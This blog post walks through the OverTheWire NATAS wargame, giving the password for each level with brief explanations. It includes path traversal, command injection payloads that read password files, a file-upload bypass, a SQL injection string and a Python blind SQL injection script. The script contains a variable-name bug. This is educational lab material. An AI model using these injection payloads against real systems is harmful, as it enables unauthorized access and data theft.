---
title: "NATAS Walkthrough"
date: 2024-03-24
# weight: 1
# aliases: ["/first"]
author: "Dharmik Kantesaria"
# author: ["Me", "You"] # multiple authors
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "A brief guide to solving NATAS Challenges on the OverTheWire platform. "
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page

---
_Note: The python script to scrap the password for these challenges was an assignment during my graduate studies. Due to academic policies, it is not available publicly. I am happy to share my work privately - reach out to me via LinkedIn._

Have fun learning web-security :)

## Natas answers for levels 1 - 15
### Level 0 -> 1
> username - _natas0_	and password - _natas0_

In level 0, after logging in, right-click on the webpage to view the source code. The password for the next level will be mentioned in a comment in the source code.
 
### Level 1 -> 2
> username - _natas1_	and password - _g9D9cREhslqBKtcA2uocGHPfMZVzeFK6_

This level is similar to the previous level, only that right-click is now blocked. So instead we use the keyboard shortcut (_usually **ctrl+shift+c**, but could be different in the browser that you are using)  

### Level 2 -> 3
> username - _natas2_ and password - _h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7_

We can view the source code at this level, but there are no comments. We do find another directory referenced in the source code as `<img src='files/pixel.png>` indicating that there is another directory where files exist. So you add the directory `/files` to the current URL. You should see a list of files in that directory and notice there is another file named _users.txt_. You should be able to find the password for the next level when reading this file.

### Level 3 -> 4
> username - _natas3_	 and password - _G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q_

In the source code of this webpage, we find a comment that says `<!-- No more information leaks!! Not even Google will find it this time... -->` This hints us to look at the **_robots.txt_** file. So you add `/robots.txt` to the URL to view that file. This file tells 
search engines which directories they can or cannot crawl on the website. In this file, we find a directory that has not been allowed for crawling by bots, `s3cr3ts`. Now we replace the `/robots.txt` with the new found directory, and find the `users.txt` file, similar to the previous challenge. Here you will find the password for the next level.

### Level 4 -> 5
> username - _natas4_	 and password - _tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm_

This level would require you to understand how to use Burpsuite (or another tool to manipulate headers). After logging into the website using the credentials found in the previous challenge, capture the headers that were sent in the GET request. Now, you will need to change the natas level from `natas4`(the rest of the value is the same) to `natas5`(the rest of the value is the same as the original). After changing the URL Referrer, send the GET request with the modified headers. You should be able to view the password for next level on the page content that gets returned to the request made. 

### Level 5 -> 6
> username - _natas5_ and password - _Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD_

This level is similar to the previous level. The headers must be captured, and the login status must be changed from `False` to `True`. 

### Level 6 -> 7
> username - _natas6_	and password - _fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR_

This level requires you to do more digging on the website. If you view the source code, there is a hint to the answer in the `/includes/secret.inc` page that is being referred to match the entered value. When you view that page, it is blank. This will confuse the attacker. However the referred variable in the source code of the main page is from the `secrets.inc` page, so there must be a variable with the correct value to unlock the password for the next level. If you view the source code of the blank page at `/includes/secrets.inc` you should find the variable that has the "secret" value that has been commented. 

### Level 7 -> 8
> username - _natas7_ and password - _jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr_

The hint to find the answer that will give us the password is also in the source code. This time, the hint is direct and says that `<!-- hint: password for webuser natas8 is in etc/natas_webpass/natas8 -->`. This means that all we need to do is access this directory on their server to view the password for the next level. If you have used Linux before, then you must be familiar with using the `..` to change the working directory to the parent directory. If you haven't I would suggest you google about it and learn more, if possible try it out to understand better. There is a web vulnerability called Local File Inclusion, that allows a user to access the local files on a server using the `../` to go to the parent directory and then enter the directory that we want to view. When you view the "home" or "about" page, notice the keyword `?page=` in the URL. This will query the webserver to view the page mentioned after this keyword. So when we add the string `../../../../../../../etc/natas_webpass/natas8` after the `?page=` string in the URL and hit enter, the webpage should show the password for the next level. 

### Level 8 -> 9
> username - _natas8_	and password - _a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB_

This time, you see a form field with a submit button. Similar to the previous challenges, we again begin by viewing the source code of the index page. Upon analyzing the source code, we understand that an encrypted key is already written in the source code. The encoded string has been encrypted using the function defined in the source code. 
`decodedstr = base64.b64decode(bytes.fromhex(encodedstr)[::-1]).decode('utf-8')`
### Level 9 -> 10
> username - _natas9_  and password - _Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd_

inject the form field with `; cat /etc/natas_webpass/natas10*`

### Level 10 -> 11
> username - _natas10_	and password - _D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE_

inject the form field without ";", instead use "." (use the same injection string as used for the previous challenge)

### Level 11 -> 12
> username - _natas11_	and password - _1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg_

[XOR Cipher](https://en.wikipedia.org/wiki/XOR_cipher) -> Encrypted string in the source code which also includes the order of encryption and encoding. 

### Level 12 -> 13
> username - _natas12_	and password - _YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG_

upload any file, go to inspect > elements> change the random file name to the format that will unlock the password for the next level (find the required format for filename in the source code).

### Level 13 -> 14
> username - _natas13_	and password - _lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9_

Open the file in a notepad and then add image exif header `GIF87a` at the beginning and the rest is similar to natas12. You can use any other image exif headers as you just need to validate one of the functions that look for image exif headers on the file uploaded (see it in the source code). Refer to this Wikipedia page for other headers - https://en.wikipedia.org/wiki/List_of_file_signatures 

### Level 14 -> 15
>username - _natas14_	and password - _qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP_

SQL injection, use any string for the username (which user would exist by default?) and password string as `" or "1"="1`

### Level 15 -> 16
> username - _natas15_	and password - _TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB_

Blind SQL injection, its like trial and error method of performing SQL queries to retrieve the desired data (google to learn more).

I used python to perform blind SQL Injection for this challenge, you can use any language you are comfortable with. 
```python
import re, requests

url = 'http://natas15.natas.labs.overthewire.org/index.php'
auth = ('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB') #auth creds from the previous challenge

passwordlist = []
ch = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" #charset

#the next 2 lines were written to understand the response of the SQL query performed.
#resp = requests.get(url,auth=auth, params = {"username":"natas16\" and password like binary \"%"})
#print(resp.text)

#Then the rest of the code was built after understanding the TRUE and the FALSE response we received. 
for i in range(32): #we know that the hash is 32 bits long, so we will need to guess 32 characters and hence iterate 32 times.
    for j in ch: #iterate through every character from the charset
        resp = requests.get(url,auth=auth, params = {"username":"natas16\" and password like binary \""+"".join(passwdlist)+j+"%"}) #perform a get request
        if "This user exists" in resp.text: #if we get a TRUE response, it means a character matches the original hash. 
            print(f"The character no {i+1} of the password found is : {j}")
            passwordlist.append(j) #append the matching character to the hash
            break

password = "".join(passwordlist)

print(f"\nThe password for Natas Level 16 is : {password}")

```

Credentials for the next challenge which is level 16 -> 17 are username - _natas16_ and password - _TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V_ 